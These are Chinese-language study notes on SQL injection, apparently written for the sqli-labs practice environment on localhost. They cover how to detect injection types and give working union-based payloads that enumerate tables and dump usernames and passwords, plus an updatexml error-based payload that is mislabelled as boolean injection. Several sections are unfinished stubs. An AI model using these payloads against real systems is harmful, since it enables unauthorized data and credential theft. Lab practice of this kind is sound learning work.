## SQL 注入

### 分类：

**数据类型：** 数字型 、字符型

**注入手法：** 联合查询、报错型注入、布尔型注入、时间延迟注入、多语句查询注入（堆叠查询）。

### 注入点的判断

**?id=1'	判断注入类型**

![1607915524399](C:\Users\goofiest\AppData\Roaming\Typora\typora-user-images\1607915524399.png)

` right syntax to use near '' LIMIT 0,1' ` 由于我们输入的 id 不在没有在报错信息中显示，所以可以判断它是**数字型**。

![1607915750952](C:\Users\goofiest\AppData\Roaming\Typora\typora-user-images\1607915750952.png)

` right syntax to use near ''1'' LIMIT 0,1' at ` 可以看见输入的 id 在报错信息中，所以可以判断它是**字符型**。



**?id=1 and 1=1** 和 **id=1 and 1=2**	页面是否发生变化，判断页面是否存在布尔类型状态。

**?id=sleep(5)** 	是否有延时。



### 联合查询

&ensp; 由于数据库中的内容会回显到页面中，所以可以采用联合查询进行注入。联合查询就是SQL语法中的`union select` 语句。该语句会同时执行两条`select`语句，生成两张虚拟表，然后把查询到的结果进行拼接。

**步骤：** 

* 判断注入类型。
* 判断注入点
* `order by ` 函数（排序）判断表中字段数。例如：`order by 3 -- -` 
* 具对数据库内容查询 `?id=-1' union select 1,2,database() -- -`

~~~sql
-- 联合查询
?id=1'and 1=1 -- - 
?id=1'order by 3 -- -  #
?id=-1'union select 1,2,3 -- -
?id=-1'union select 1,database(),user() -- -
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" -- -
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users" -- -
?id=-1'union select 1,2,group_concat(password,0x20,username) from security.users -- -
~~~



### 布尔注入

updatexml

~~~sql
http://127.0.0.1/sqli/Less-5/
?id=1' and updatexml(1,concat(0x5e,database(),0x5e),0) -- -
~~~



mid

ascii

substr

ord

regexp

like



### 宽字节注入

http://127.0.0.1/sqli/Less-32/ 






